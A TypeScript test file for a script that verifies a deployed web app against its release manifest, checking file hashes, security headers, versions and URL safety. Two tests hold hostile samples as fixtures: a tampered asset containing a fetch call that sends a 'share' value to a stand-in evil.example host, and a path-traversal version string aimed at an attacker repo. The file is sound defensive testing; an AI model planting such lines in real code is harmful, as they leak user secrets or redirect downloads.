import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { createHash } from 'node:crypto'
// @ts-expect-error - plain .mjs scripts, deliberately not part of the app's TS build
import { verifyWeb, manifestUrl, badSite, EXIT } from '../../scripts/web-verify.mjs'
// @ts-expect-error - plain .mjs script
import { buildManifest, serializeManifest } from '../../scripts/web-manifest.mjs'

// #605: verify-web against a site served here, so every verdict is checked against real HTTP.
const COMMIT = '0123456789abcdef0123456789abcdef01234567'
const HEADERS = { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "default-src 'self'" }
const sha = (b: string) => createHash('sha256').update(b).digest('hex')

type Site = { files: Record<string, string>; headers: Record<string, string>; redirect?: string }
let site: Site
let server: Server
let origin: string

const fresh = (): Site => ({
  files: {
    'index.html': '<!doctype html><script src="./assets/index-AAAAAAAA.js"></script>',
    'assets/index-AAAAAAAA.js': 'console.log(1)',
    'version.json': JSON.stringify({ version: '0.22.0', commit: COMMIT.slice(0, 7) }),
  },
  headers: { ...HEADERS },
})

const manifestOf = (s: Site, over: Partial<{ version: string; commit: string }> = {}) => serializeManifest(buildManifest({
  version: over.version ?? '0.22.0',
  commit: over.commit ?? COMMIT,
  env: { VITE_RELAY_BASE: 'https://relay.konclave.xyz' },
  headers: HEADERS,
  files: Object.entries(s.files).map(([path, body]) => ({ path, sha256: sha(body), size: Buffer.byteLength(body) })),
}))

beforeAll(async () => {
  server = createServer((req, res) => {
    const path = decodeURIComponent((req.url ?? '/').split('?')[0]).replace(/^\//, '') || 'index.html'
    if (site.redirect && path === site.redirect) { res.writeHead(308, { Location: 'https://elsewhere.example/' }); res.end(); return }
    const body = site.files[path]
    if (body === undefined) { res.writeHead(404); res.end(); return }
    res.writeHead(200, site.headers)
    res.end(body)
  })
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
})
afterAll(() => new Promise<void>((r) => server.close(() => r())))

const run = async (opts: Record<string, unknown> = {}) => {
  const r = await verifyWeb({ site: origin, ...opts })
  return { code: r.code as number, out: (r.lines as string[]).join('\n') }
}
const withManifest = (text: string) => ({ manifest: { text, from: 'test' } })

describe('verify-web (#605)', () => {
  it('passes a site that serves exactly the release, files and headers', async () => {
    site = fresh()
    const { code, out } = await run(withManifest(manifestOf(site)))
    expect(out).toMatch(/PASS assets\/index-AAAAAAAA\.js/)
    expect(out).toMatch(/PASS \/ \(index\.html\)/)
    expect(out).toMatch(/PASS header Content-Security-Policy/)
    expect(out).toMatch(/does not stop a compromised server/)
    expect(code).toBe(EXIT.PASS)
  })

  it('names a file whose bytes changed', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.files['assets/index-AAAAAAAA.js'] = 'fetch("https://evil.example/" + share)'
    const { code, out } = await run(withManifest(m))
    expect(out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(expected [0-9a-f]{64}, got [0-9a-f]{64}\)/)
    expect(code).toBe(EXIT.FAIL)
  })

  it('fails a missing file and a redirect, which it never follows', async () => {
    site = fresh()
    const m = manifestOf(site)
    delete site.files['assets/index-AAAAAAAA.js']
    expect((await run(withManifest(m))).out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(HTTP 404\)/)
    site = fresh()
    site.redirect = 'assets/index-AAAAAAAA.js'
    const r = await run(withManifest(manifestOf(fresh())))
    expect(r.out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(HTTP 308\)/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('fails a loosened security header', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.headers['Content-Security-Policy'] = "default-src *"
    const { code, out } = await run(withManifest(m))
    expect(out).toMatch(/FAIL header Content-Security-Policy \(expected "default-src 'self'", got "default-src \*"\)/)
    expect(code).toBe(EXIT.FAIL)
  })

  it('says NOT A RELEASE when the site serves another commit under the same version', async () => {
    site = fresh()
    const { code, out } = await run(withManifest(manifestOf(site, { commit: 'f'.repeat(40) })))
    expect(out).toMatch(/NOT A RELEASE/)
    expect(out).not.toMatch(/PASS assets/)
    expect(code).toBe(EXIT.FAIL)
  })

  it('refuses a site older than the version expected, and a manifest of another version', async () => {
    site = fresh()
    expect((await run({ ...withManifest(manifestOf(site)), expectVersion: '0.23.0' })).out).toMatch(/serves 0\.22\.0, expected 0\.23\.0/)
    const r = await run(withManifest(manifestOf(site, { version: '0.21.0' })))
    expect(r.out).toMatch(/the site says 0\.22\.0, the manifest is of 0\.21\.0/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('treats a malformed manifest as a usage error, not a verdict', async () => {
    site = fresh()
    const m = manifestOf(site)
    const r = await run(withManifest(m.replace(/\n$/, '')))
    expect(r.out).toMatch(/USAGE web manifest: not in canonical form/)
    expect(r.code).toBe(EXIT.USAGE)
  })

  it('is inconclusive when the site does not answer, or the release has no manifest yet', async () => {
    const closed = await run({ site: 'http://127.0.0.1:1', ...withManifest(manifestOf(fresh())) })
    expect(closed.code).toBe(EXIT.INCONCLUSIVE)
    site = fresh()
    const seen: string[] = []
    const fetchFn = (url: string, init: RequestInit) => {
      seen.push(url)
      return url.startsWith('https://github.com/') ? Promise.resolve(new Response(null, { status: 404 })) : fetch(url, init)
    }
    const r = await run({ fetchFn })
    expect(seen).toContain('https://github.com/deegalabs/konclave/releases/download/v0.22.0/web-manifest.json')
    expect(r.out).toMatch(/INCONCLUSIVE no published manifest for v0\.22\.0/)
    expect(r.code).toBe(EXIT.INCONCLUSIVE)
  })

  it('never builds a manifest URL from a version it has not validated', async () => {
    site = fresh()
    site.files['version.json'] = JSON.stringify({ version: '0.21.0/../../../../attacker/repo/releases/download/v1', commit: 'x' })
    const seen: string[] = []
    const r = await run({ fetchFn: (url: string, init: RequestInit) => { seen.push(url); return fetch(url, init) } })
    expect(r.out).toMatch(/FAIL version\.json names no release version/)
    expect(seen.some((u) => u.includes('attacker'))).toBe(false)
    expect(() => manifestUrl('0.21.0/../x')).toThrow()
    expect(manifestUrl('0.21.0')).toBe('https://github.com/deegalabs/konclave/releases/download/v0.21.0/web-manifest.json')
  })

  it('checks https origins only, plain http on the loopback alone', () => {
    expect(badSite('https://www.konclave.xyz')).toBeNull()
    expect(badSite('http://127.0.0.1:8080')).toBeNull()
    expect(badSite('http://www.konclave.xyz')).toMatch(/https only/)
    expect(badSite('https://www.konclave.xyz/')).toMatch(/origin/)
    expect(badSite('nope')).toMatch(/not a URL/)
  })
})
